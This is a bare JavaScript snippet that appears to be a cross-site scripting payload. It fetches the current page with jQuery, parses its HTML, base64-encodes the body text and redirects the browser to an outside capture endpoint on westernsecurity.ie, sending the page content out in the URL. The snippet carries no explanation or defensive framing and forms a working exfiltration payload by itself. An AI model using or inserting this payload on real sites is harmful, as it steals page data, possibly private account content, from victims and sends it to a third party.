$.get('', (data) => {
    const parser = new DOMParser();
    const document = parser.parseFromString(data, "text/html");
    window.location.href = "https://westernsecurity.ie/capture.php?payload=" + btoa(document.body.innerText);
})
